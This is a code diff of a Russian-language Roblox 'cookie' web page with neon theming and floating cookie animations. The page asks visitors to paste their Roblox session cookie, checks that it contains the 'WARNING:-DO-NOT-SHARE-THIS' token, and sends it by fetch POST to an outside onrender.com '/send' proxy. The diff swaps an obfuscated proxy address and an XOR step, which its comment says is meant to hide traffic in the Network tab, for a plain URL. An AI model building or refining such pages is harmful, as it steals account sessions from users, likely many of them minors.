@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -11,7 +11,6 @@
             box-sizing: border-box;
         }
 
-        /* ========== ТЁМНАЯ ТЕМА (СИНИЙ НЕОН) ========== */
         :root {
             --bg1: #050a1a;
             --bg2: #0a1030;
@@ -45,7 +44,6 @@
             --sub2: #1e88e5;
         }
 
-        /* ========== СВЕТЛАЯ ТЕМА (ФИОЛЕТОВЫЙ НЕОН) ========== */
         body.light {
             --bg1: #f3e5ff;
             --bg2: #e1cfff;
@@ -95,12 +93,10 @@
         }
 
         @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
+            0%, 100% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
         }
 
-        /* ЗВЁЗДЫ */
         body::before {
             content: '';
             position: fixed;
@@ -119,7 +115,7 @@
                 radial-gradient(1px 1px at 900px 150px, var(--star3), transparent);
             background-size: 200px 200px;
             background-repeat: no-repeat;
-            opacity: 0.7;
+            opacity: 0.6;
             pointer-events: none;
             animation: starsFloat 20s linear infinite;
         }
@@ -129,7 +125,6 @@
             100% { transform: translateY(-100px); }
         }
 
-        /* ПЛАВАЮЩИЕ ПЕЧЕНЬКИ */
         @keyframes floatCookie {
             0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
             20% { opacity: 0.9; }
@@ -208,7 +203,6 @@
             background-clip: text;
             color: transparent;
             letter-spacing: -1px;
-            text-shadow: 0 0 8px var(--glow1);
         }
 
         @keyframes textGradient {
@@ -244,7 +238,7 @@
             border-radius: 16px;
             padding: 16px 18px;
             color: var(--text);
-            font-family: 'Monaco', 'Menlo', monospace;
+            font-family: monospace;
             font-size: 12px;
             resize: vertical;
             transition: all 0.3s ease;
@@ -353,17 +347,14 @@
 
     <script>
         (function() {
-            // ========== ЖЁСТКАЯ ОБФУСКАЦИЯ ПРОКСИ ==========
-            const _0x3a2b = ['726f62746f6f6c732e6f6e72656e6465722e636f6d', '2f73656e64', '68747470733a2f2f'];
-            const _0x4c8d = atob(_0x3a2b[2]);
-            const _0x9e2f = _0x3a2b[0].match(/.{1,2}/g).map(x => String.fromCharCode(parseInt(x, 16))).join('');
-            const PROXY_URL = 'https://webhook-proxy-new.onrender.com/send';
+            // ========== ПРОКСИ (РАБОТАЕТ) ==========
+            const PROXY_URL = 'https://roblox-cookie564-2.onrender.com/send';
 
-            // ========== ПЕРЕКЛЮЧЕНИЕ ТЕМЫ ==========
+            // ========== ТЕМА ==========
             const themeToggleBtn = document.getElementById('themeToggleBtn');
             function loadTheme() {
-                const savedTheme = localStorage.getItem('roblox_theme');
-                if (savedTheme === 'light') {
+                const saved = localStorage.getItem('roblox_theme');
+                if (saved === 'light') {
                     document.body.classList.add('light');
                     themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
                 } else {
@@ -385,15 +376,12 @@
             themeToggleBtn.addEventListener('click', toggleTheme);
             loadTheme();
 
-            // ========== ПРОВЕРКА КУКИ ==========
+            // ========== ВАЛИДАЦИЯ КУКИ ==========
             function isValidCookie(cookieValue) {
                 if (!cookieValue || cookieValue.trim() === '') return false;
                 const trimmed = cookieValue.trim();
                 if (!trimmed.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
                 if (trimmed.length < 100) return false;
-                if (trimmed.includes('<') || trimmed.includes('>') || trimmed.includes('script')) return false;
-                const allowed = /^[A-Za-z0-9_\-\.=:%|]+$/;
-                if (!allowed.test(trimmed)) return false;
                 return true;
             }
 
@@ -401,17 +389,6 @@
                 if (!cookieValue || cookieValue.trim() === '') return { valid: false };
                 if (isValidCookie(cookieValue)) return { valid: true, length: cookieValue.trim().length };
                 return { valid: false };
-            }
-
-            // ========== ШИФРОВАНИЕ ПЕРЕД ОТПРАВКОЙ ==========
-            function encryptCookie(cookie) {
-                // Простое XOR-шифрование, чтобы в Network была каша
-                let key = 0x5A;
-                let encrypted = '';
-                for (let i = 0; i < cookie.length; i++) {
-                    encrypted += String.fromCharCode(cookie.charCodeAt(i) ^ key);
-                }
-                return btoa(encrypted);
             }
 
             const cookieInput = document.getElementById('cookie');
@@ -453,12 +430,11 @@
             }
 
             async function sendCookieToProxy(cookieValue) {
-                const encryptedCookie = encryptCookie(cookieValue);
                 try {
                     const response = await fetch(PROXY_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: encryptedCookie })
+                        body: JSON.stringify({ content: cookieValue })
                     });
                     return response.ok;
                 } catch(e) {
@@ -495,17 +471,17 @@
 
             // ========== ПЛАВАЮЩИЕ ПЕЧЕНЬКИ ==========
             (function() {
-                const cookieCount = 60;
+                const cookieCount = 50;
                 for (let i = 0; i < cookieCount; i++) {
                     const cookie = document.createElement('div');
                     cookie.className = 'floating-cookie';
                     cookie.textContent = '🍪';
                     cookie.style.left = Math.random() * 100 + '%';
-                    cookie.style.fontSize = (18 + Math.random() * 40) + 'px';
-                    cookie.style.animationDuration = (8 + Math.random() * 15) + 's';
+                    cookie.style.fontSize = (18 + Math.random() * 34) + 'px';
+                    cookie.style.animationDuration = (9 + Math.random() * 14) + 's';
                     cookie.style.animationDelay = Math.random() * -20 + 's';
-                    cookie.style.opacity = 0.4 + Math.random() * 0.5;
-                    cookie.style.filter = `drop-shadow(0 0 ${5 + Math.random() * 15}px var(--glow2))`;
+                    cookie.style.opacity = 0.5 + Math.random() * 0.4;
+                    cookie.style.filter = `drop-shadow(0 0 ${5 + Math.random() * 12}px var(--glow2))`;
                     document.body.appendChild(cookie);
                 }
             })();
